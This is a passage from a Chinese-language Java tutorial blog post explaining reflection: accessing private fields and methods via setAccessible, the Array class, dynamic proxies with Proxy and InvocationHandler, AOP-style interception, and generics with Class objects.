System.out.println(epf.getObject(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面程序中<code>initProperty()</code>方法里<code>Method mtd = targetClass.getMethod(mtdName, String.class)</code>获取目标类包含一个String参数的stter方法，<code>mtd.invoke(target, config.getProperty(name))</code>通过调用Method的<code>invoke()</code>方法来执行该setter方法，该方法执行完后，就相当于执行了目标对象的setter方法。为上面程序配置文件</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">a</span>=javax.swing.JFrame</span><br><span class="line"><span class="attribute">b</span>=javax.swing.JLabel</span><br><span class="line"><span class="comment">#set the title of a</span></span><br><span class="line">a%<span class="attribute">title</span>=Test Title</span><br></pre></td></tr></table></figure>

<p>上面配置文件中的a%title行表明希望调用a对象的<code>setTitle()</code>方法，调用该方法的参数值为Test Title。编译、运行上面的ExtendedObjectPoolFactory.java程序，可以看到输出一个JFrame窗口，该窗口的标题为Test Title。</p>
<p>当通过Method的<code>invoke()</code>方法来调用对应的方法时，Java会要求程序必须有调用该方法的权限。如果程序确实需要调用某个对象的private方法，则可以先调用Method对象的如下方法。</p>
<blockquote>
<p>setAccessible(boolean flag): 将Method对象的accessible设置为指定的布尔值。值为true，指示该Method在使用是应该取消Java语言的访问权限检查；值为false，则指示该Method在使用是要实施Java语言的访问权限检查。</p>
</blockquote>
<p>实际上，<code>setAccessible()</code>方法并不属于Method，而是属性它的父类AccessibleObject。因此Method、Constructor、Field都可调用该方法，从而实现通过反射来调用private方法、private构造器和private成员变量。也就是说，它们可以通过调用该方法来取消访问权限检查，通过反射即可访问private成员。</p>
<h3 id="4-3-访问成员变量值"><a href="#4-3-访问成员变量值" class="headerlink" title="4.3 访问成员变量值"></a>4.3 访问成员变量值</h3><p>通过Class对象的<code>getFields()</code>或<code>getField()</code>方法可以获取该类所包括的全部成员变量或指定成员变量。Field提供了如下两组方法来读取或设置成员变量值。</p>
<ul>
<li>getXxx(Object obj): 获取obj对象的该成员变量的值。此处的Xxx对应8种基本类型，如果该成员变量的类型是引用类型，则取消get后面的Xxx。</li>
<li>setXxx(Object obj, Xxx val): 将obj对象的该成员变量设置成val值。此处的Xxx对应8种基本类型，如果该成员变量的类型是引用类型，则取消set后面的Xxx。</li>
</ul>
<p>使用这两个方法可以随意地访问对象的所有成员变量，包括private修饰的成员变量。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FieldTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="comment">//创建一个Person对象</span></span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        <span class="comment">//获取Person类对应的Class对象</span></span><br><span class="line">        Class&lt;Person&gt; personClazz = Person.class;</span><br><span class="line">        <span class="comment">//获取Person的名为name的成员变量</span></span><br><span class="line">        <span class="comment">//使用getDeclaredField()方法表明可获取各种访问控制符的成员变量</span></span><br><span class="line">        Field nameField = personClazz.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">//设置通过反射访问该成员变量时取消访问权限检查</span></span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//调用set()方法为p对象的name成员变量设置值</span></span><br><span class="line">        nameField.set(p, <span class="string">&quot;shadowtest&quot;</span>);</span><br><span class="line">        <span class="comment">//获取Person类名为age的成员变量</span></span><br><span class="line">        Field ageField = personClazz.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        <span class="comment">//设置通过反射访问该成员变量时取消访问权限检查</span></span><br><span class="line">        ageField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//调用setInt()方法为P对象的age成员变量设置值</span></span><br><span class="line">        ageField.setInt(p, <span class="number">30</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person[name:&quot;</span> + name + <span class="string">&quot;, age:&quot;</span> + age + <span class="string">&quot; ]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面程序中先定义了一个Person类，该类里包含两个private成员变量，该类里包含两个private成员变量：name和age，在通常情况下，这两个成员变量只能在Person类里访问。但本程序FieldTest的<code>main()</code>方法中通过反射修改了Person对象的name、age两个成员变量的值。使用<code>getDeclaredField()</code>方法获取了名为name的成员变量，注意此处不是<code>getField()</code>方法，因为<code>getField()</code>方法只能获取public访问控制的成员变量，而<code>getDeclaredField()</code>方法则可以获取所有的成员变量。</p>
<h3 id="4-4-操作数组"><a href="#4-4-操作数组" class="headerlink" title="4.4 操作数组"></a>4.4 操作数组</h3><p>在java.lang.reflect包下还提供了一个Array类，Array对象可以代表所有的数组。程序可以通过使用Array来动态地创建数组，数组操作元素等。</p>
<p>Array提供了如下几类方法:</p>
<ul>
<li>static Object newInstance(Class&lt;?&gt; compnentType, int… length): 创建一个具有指定元素类型、指定维度的新数组。</li>
<li>static xxx getXxx(Object array, int index): 返回array数组中第index个元素。其中xxx是各种基本数据类型，如果数组元素是引用类型，则该方法变为get(Object array, int index).</li>
<li><code>static void setXxx(Object array, int index, xxx val):</code>将array数组中第index个元素的值设为val。其中xxx是各种基本数据类型，如果数组元素是引用类型，则该方法变成set(Object array, int index, Object val).</li>
</ul>
<p>下面的程序示范了如何使用Array来生成数组，为指定数组元素赋值，并获取指定数组元素的方式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建一个元素类型为String，长度为10的数组</span></span><br><span class="line">        Object arr = Array.newInstance(String.class, <span class="number">10</span>);</span><br><span class="line">        <span class="comment">//依次为arr数组中index为5、6的元素赋值</span></span><br><span class="line">        Array.set(arr, <span class="number">5</span>, <span class="string">&quot;shadowtest&quot;</span>);</span><br><span class="line">        Array.set(arr, <span class="number">6</span>, <span class="string">&quot;shadowtestx&quot;</span>);</span><br><span class="line">        <span class="comment">//依次取出arr数组中index为5、6的元素的值</span></span><br><span class="line">        Object book1 = Array.get(arr,<span class="number">5</span>);</span><br><span class="line">        Object book2 = Array.get(arr,<span class="number">6</span>);</span><br><span class="line">        <span class="comment">//输出arr数组中index为5、6的元素的值</span></span><br><span class="line">        System.out.println(book1);</span><br><span class="line">        System.out.println(book2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的程序中代码分别是通过Array创建数组，为数组元素设置值，访问数组元素的值，程序通过Array就可以动态创建并操作数组。</p>
<h2 id="5-使用反射生成JDK动态代理"><a href="#5-使用反射生成JDK动态代理" class="headerlink" title="5. 使用反射生成JDK动态代理"></a>5. 使用反射生成JDK动态代理</h2><p>在Java的java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过使用这个类和接口可以生成JDK动态代理类或动态代理对象。</p>
<h3 id="5-1-使用Proxy和InvocationHandler创建动态代理"><a href="#5-1-使用Proxy和InvocationHandler创建动态代理" class="headerlink" title="5.1 使用Proxy和InvocationHandler创建动态代理"></a>5.1 使用Proxy和InvocationHandler创建动态代理</h3><p>proxy提供了用于创建动态代理类和代理对象的静态方法，它也是所有动态代理类的父类。如果在程序中为一个或多个接口动态地生成实现类，就可以使用Proxy来创建动态代理类：如果需要为一个或多个接口动态的创建实例，也可以使用Proxy来创建动态代理实例。</p>
<p>Proxy提供了如下两个方法来创建动态代理类和动态代理实例。</p>
<ul>
<li><p><code>static Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces):</code></p>
<p>创建一个动态代理类所对应的Class对象，该代理类将实现interface所指定的多个接口。第一个ClassLoader参数指定生成动态代理类的类加载器。</p>
</li>
<li><p><code>static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h):</code></p>
<p>直接创建一个动态代理对象，该代理对象的实现类实现了interfaces指定的系列接口，执行代理对象的每个方法时都会被替换执行InvocationHandler对象的invoke方法。  </p>
</li>
</ul>
<p>实际上，即使采用第一个方法生成动态代理类之后，如果程序需要通过该代理类来创建对象，依然需要传入一个InvocationHandler对象。也就是说，系统生成的每个代理对象都有一个与之关联的InvocationHandler对象。</p>
<p>计算机是很”蠢“的，当程序使用反射方式为指定接口生成系列动态代理对象时，这些动态代理对象的实现类实现了一个或多个接口。动态代理对象就需要实现一个或多个接口里定义的所有方法，但问题是：系统怎么知道如何实现这些方法？这个时候就轮到InvocationHandler对象登场了——当执行动态代理对象里的方法时，实际上会替换成调用InvocationHandler对象的invoke方法。</p>
<p>程序中可以采用先生成一个动态代理类，然后通过动态代理类来创建代理对象的方式生成一个动态代理对象。代码片段如下：</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个InvocationHandler对象</span></span><br><span class="line">InvocationHandler handler = <span class="keyword">new</span> MyInvocationHandler(...);</span><br><span class="line"><span class="comment">//使用Proxy生成一个动态代理类proxyClass</span></span><br><span class="line"><span class="keyword">Class</span> proxyClass = Proxy.getProxyClass(Foo.class.getClassLoader(), <span class="keyword">new</span> <span class="keyword">Class</span>[] <span class="comment">&#123;Foo.class&#125;</span>)</span><br><span class="line"><span class="comment">//获取proxyClass类中带一个InvocationHandler参数的构造器</span></span><br><span class="line"><span class="function"><span class="keyword">constructor</span> <span class="title">ctor</span> = <span class="title">proxyClass</span>.<span class="title">getConstructor</span><span class="params">(<span class="keyword">new</span> <span class="keyword">Class</span>[] &#123;InvocationHandler.<span class="keyword">class</span>&#125;)</span>;</span></span><br><span class="line"><span class="comment">//调用ctor的newInstance方法来创建动态实例</span></span><br><span class="line">Foo f = (Foo)ctor.newInstance(<span class="keyword">new</span> Object[]<span class="comment">&#123;handler&#125;</span>);</span><br></pre></td></tr></table></figure>

<p>上面的代码也可以简化成如下代码：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个InvocationHandler对象</span></span><br><span class="line">InvocationHandler handler = <span class="keyword">new</span> <span class="constructor">MyInvocationHandler(<span class="operator">...</span>)</span>;</span><br><span class="line"><span class="comment">//使用Proxy直接生成一个动态代理</span></span><br><span class="line">Foo f = (Foo)<span class="module-access"><span class="module"><span class="identifier">Proxy</span>.</span></span><span class="keyword">new</span><span class="constructor">ProxyInstance(Foo.<span class="params">class</span>.<span class="params">getClassLoader</span>()</span>, <span class="keyword">new</span> Class<span class="literal">[]</span>&#123;<span class="module-access"><span class="module"><span class="identifier">Foo</span>.</span></span><span class="keyword">class</span>&#125;, handler);</span><br></pre></td></tr></table></figure>

<p>下面程序示范了使用Proxy和InvocationHandler来生成动态代理对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyInvokationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    执行动态代理对象的所有方法时，都会被替换成执行如下的invoke方法</span></span><br><span class="line"><span class="comment">    其中：</span></span><br><span class="line"><span class="comment">        proxy: 代表动态代理对象</span></span><br><span class="line"><span class="comment">        method: 代表正在执行的方法</span></span><br><span class="line"><span class="comment">        args: 代表调用目标方法时传入的实参</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;-----正在执行的方法：&quot;</span> + method);</span><br><span class="line">        <span class="keyword">if</span> (args != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;下面是执行该方法时传入的实参为：&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (Object val : args) &#123;</span><br><span class="line">                System.out.println(val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用该方法没有实参！&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建一个InvocationHandler对象</span></span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> MyInvokationHandler();</span><br><span class="line">        <span class="comment">//使用指定的InvocationHandler来生成一个动态代理对象</span></span><br><span class="line">        Person p = (Person) Proxy.newProxyInstance(Person.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Person.class&#125;, handler);</span><br><span class="line">        <span class="comment">//调用动态代理对象的walk()和sayHello()方法</span></span><br><span class="line">        p.walk();</span><br><span class="line">        p.sayHello(<span class="string">&quot;孙悟空&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的程序首先提供了一个Person接口，该接口包含了<code>walk()</code>和<code>sayHello()</code>两个抽象方法，接着定义了一个简单的InvocationHandler实现类，定义该实现类时需要重写<code>invoke()</code>方法中的三个参数，解释如下</p>
<ul>
<li>proxy: 代表动态代理对象</li>
<li>method: 代表正在执行的方法</li>
<li>args: 代表调用目标方法时传入的实参。</li>
</ul>
<p>上面程序中<code>InvocationHandler handler = new MyInvokationHandler();</code>创建了一个InvocationHandler对象，<code>Person p = (Person) Proxy.newProxyInstance(Person.class.getClassLoader(), new Class[]&#123;Person.class&#125;, handler);</code>根据InvocationHandler对象创建了一个动态代理对象。运行上面的程序</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">-----正在执行的方法：<span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> reflect.Person.walk()</span><br><span class="line">调用该方法没有实参！</span><br><span class="line">-----正在执行的方法：<span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> reflect.Person.sayHello(java.lang.<span class="keyword">String</span>)</span><br><span class="line">下面是执行该方法时传入的实参为：</span><br><span class="line">孙悟空</span><br></pre></td></tr></table></figure>

<p>运行结果可以看出，不管程序时执行代理对象的<code>walk()</code>方法，还是执行代理对象的<code>sayHello()</code>方法，实际上都是执行InvocationHandler对象的<code>invoke()</code>方法</p>
<p>看完上面的示例，可能有人会觉得这个程序没有太大的实用价值，难以理解Java动态代理的魅力。实际上，在普通编程过程中，确实无须实用动态代理，但在编写框架或底层基础代码时，动态代理的作用就非常大。</p>
<h3 id="5-2-动态代理和AOP"><a href="#5-2-动态代理和AOP" class="headerlink" title="5.2 动态代理和AOP"></a>5.2 动态代理和AOP</h3><p>根据前面介绍的Proxy和InvocationHandler，实在很难看出这种动态代理的优势。下面介绍一种更实用的动态代理机制。</p>
<p>开发实际应用的软件系统是，通常会存在相同代码段重复出现的情况，在这种情况下，对于许多刚开始从事软件开发的人而言，他们的做法是：选中那些代码，一路”复制“、”粘贴“，立即实现了系统功能，如果仅仅从软件功能上来看，他们确实已经完成了软件开发。</p>
<p>如果有100甚至1000个地方使用了相同的代码，如果要修改、维护这段代码将会变成噩梦。在这种情况下，大部分有经验的开发者都会将这段代码定义成一个方法，然后让另外代码直接调用即可。但是这又面对一个问题，如果有一百个地方都调用了一个方法，都硬编码了，同样不优雅，需要解耦，可以通过动态代理来避免硬编码。</p>
<p>由于JDK动态代理只能为接口创建动态代理，所以下面先提供一个Dog接口，该接口代码非常简单，仅仅在该接口里定义了两个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="comment">//info()方法申明</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//run()方法声明</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面接口里只是简单地定义了两个方法，并未提供方法实现。如果直接使用Proxy为该接口创建动态代理对象，则动态代理对象的所有方法的执行效果又将完全一样。实际情况通常是，软件系统会为该Dog接口提供一个或多个实现类，此处先提供一个简单的实现类：GunDog</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GunDog</span> <span class="keyword">implements</span> <span class="title">Dog</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hunt dog&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;run quick&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面代码没有丝毫的特别之处，该Dog的实现类仅仅为每个方法提供了一个简单实现。再看需要实现的功能：程序执行<code>info()</code>、<code>run()</code>方法时能调用某个通用方法，但又不想以硬编码方式调用该方法。下面提供一个DogUtil类，该类里包含两个通用方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DogUtil</span> </span>&#123;</span><br><span class="line">    <span class="comment">//第一个拦截器方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;====模拟第一个通用方法===&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;===模拟通用方法二==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>借助于Proxy和InvocationHandler就可以实现——当程序调用<code>info()</code>方法和<code>run()</code>方法时，系统可以”自动“将<code>method1()</code>和<code>method2()</code>两个通用方法插入<code>info()</code>和<code>run()</code>方法中执行。</p>
<p>这个程序的关键在于下面的MyInvokationHandler类，该类是一个InvocationHandler实现类，该实现类的<code>invoke()</code>方法将会作为代理对象的方法实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyInvokationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">//需要被代理的对象</span></span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTarget</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行动态代理对象的所有方法时，都会被替换成执行如下的invoke方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        DogUtil du = <span class="keyword">new</span> DogUtil();</span><br><span class="line">        <span class="comment">//执行DogUtil对象中的method方法</span></span><br><span class="line">        du.method1();</span><br><span class="line">        <span class="comment">//以target作为主调来执行method方法</span></span><br><span class="line">        Object result = method.invoke(target, args);</span><br><span class="line">        <span class="comment">//执行DogUtil对象中的method2方法</span></span><br><span class="line">        du.method2();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的程序实现了<code>invoke()</code>方法时包含一行关键代码<code>Object result = method.invoke(target, args);</code>，这行代码通过反射以target作为主调来执行method方法，这就是回调了target对象的原有方法。这行代码之前调用了DogUtil对象的<code>method1()</code>方法，之后调用了DogUtil对象的<code>method2()</code>方法。</p>
<p>下面再为程序提供了一个MyProxyFactory类，该对象专为指定的target生成动态代理实例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProxyFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">//为指定的target生成动态代理对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getProxy</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建一个MyInvokationHandler对象</span></span><br><span class="line">        MyInvokationHandler handler = <span class="keyword">new</span> MyInvokationHandler();</span><br><span class="line">        <span class="comment">//为MyInvokationHandler设置target对象</span></span><br><span class="line">        handler.setTarget(target);</span><br><span class="line">        <span class="comment">//创建并返回一个动态代理</span></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), handler);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的动态代理工厂类提供了一个<code>getProxy()</code>方法，该方法为target对象生成一个动态代理对象，这个动态代理对象与target实现了相同的接口，所以具有相同的public方法——从这个意义上来看，动态代理对象可以当成target对象使用。当程序调用动态代理对象的指定方法时，实际上将变为执行MyInvocationHandler对象的<code>invoke()</code>方法。例如，调用动态代理对象的<code>info()</code>方法，其执行步骤如下：</p>
<ol>
<li>创建DogUtil实例</li>
<li>执行DogUtil实例的<code>method1()</code>方法</li>
<li>使用反射以target作为调用者执行<code>info()</code>方法</li>
<li>执行DogUtil实例的<code>method2()</code>方法</li>
</ol>
<p>看到上面的执行过程，读者应该已经发现：当使用动态代理对象来代替target对象时，代理对象的方法就实现了前面的要求——程序执行<code>info()</code>、<code>run()</code>、方法时自动”插入“<code>method1()</code>、<code>method2()</code>方法。<font color="red">如果有一百个地方在调用<code>info()</code>、<code>run()</code>方法时都需要调用<code>method1()</code>和<code>method2()</code>方法，我们就不用重复写调用方法的代码了，我们写了动态代理，那么就会在自动添加method方法，实现了功能的增强。其实这里我们可以发现，动态代理跟装饰器是有点类似的，装饰器的定义是：在不改变原有对象的基础上，给原始对象添加增强功能。都是功能增强，它们还是有区别的，装饰器是对之前的功能进行扩展，而动态代理添加的可能是完全无关的一个模块。</font></p>
<p>下面提供一个主程序来测试中动态代理的效果。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建一个原始的GunDog对象，作为target</span></span><br><span class="line">        Dog target = <span class="keyword">new</span> GunDog();</span><br><span class="line">        <span class="comment">//以指定的target来创建动态代理对象</span></span><br><span class="line">        Dog dog = (Dog)MyProxyFactory.getProxy(target);</span><br><span class="line">        dog.info();</span><br><span class="line">        dog.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面程序中的dog对象实际上是动态代理对象，只是该动态代理对象也实现了Dog接口，所以也可以当成Dog对象使用。程序执行dog的<code>info()</code>和<code>run()</code>方法时，实际上会先执行DogUtil的<code>method1()</code>方法，再执行target对象的<code>info()</code>和<code>run()</code>方法，最后执行DogUtil的<code>method2()</code>方法。运行上面程程序会看到如下运行结果</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">====模拟第一个通用方法===</span></span><br><span class="line">hunt dog</span><br><span class="line"><span class="comment">===模拟通用方法二==</span></span><br><span class="line"><span class="comment">====模拟第一个通用方法===</span></span><br><span class="line">run quick</span><br><span class="line"><span class="comment">===模拟通用方法二==</span></span><br></pre></td></tr></table></figure>

<p>从结果来看，不难发现采用动态代理可以非常灵活地实现解耦。通常而言，使用Proxy生成一个动态代理时，往往并不会凭空产生一个动态代理，这样没有太大的实际意义。通常都是为指定的目标对象生成动态代理。</p>
<p>这种动态代理在AOP（Aspect Orient Programming，面向切面编程）中被称为AOP代理，<font color="red">AOP代理可代替目标对象，AOP代理包含了目标对象的全部方法。但AOP代理中的方法与目标对象的方法存在差异：AOP代理里的方法可以在执行目标方法之前、之后插入一些通用处理。</font></p>
<h2 id="6-反射和泛型"><a href="#6-反射和泛型" class="headerlink" title="6. 反射和泛型"></a>6. 反射和泛型</h2><p>从JDK5以后，Java的Class类增加了泛型功能，从而允许使用泛型来限制Class类，例如，String.class的类型实际上是<code>Class&lt;String&gt;</code>。如果Class对应的类暂时未知，则使用Class&lt;?&gt;。通过在反射中使用泛型，可以避免使用反射生成的对象需要强制类型转换。</p>
<h3 id="6-1-泛型和Class类"><a href="#6-1-泛型和Class类" class="headerlink" title="6.1 泛型和Class类"></a>6.1 泛型和Class类</h3><p>使用<code>Class&lt;T&gt;</code>泛型可以避免强制类型转换。例如，下面提供一个简单的对象工厂，该对象工厂可以根据指定类来提供该类的实例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrazyitObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getInstance</span><span class="params">(String clsName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//创建指定类的class对象</span></span><br><span class="line">        Class cls = Class.forName(clsName);</span><br><span class="line">        <span class="comment">//返回该class对象创建的实例</span></span><br><span class="line">        <span class="keyword">return</span> cls.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的代码根据指定的字符串类型创建了一个新对象，但这个对象的类型是Object，因此当需要使用CrazyitObjectFactory的<code>getInstance()</code>方法来创建对象时，将会看到如下代码：</p>
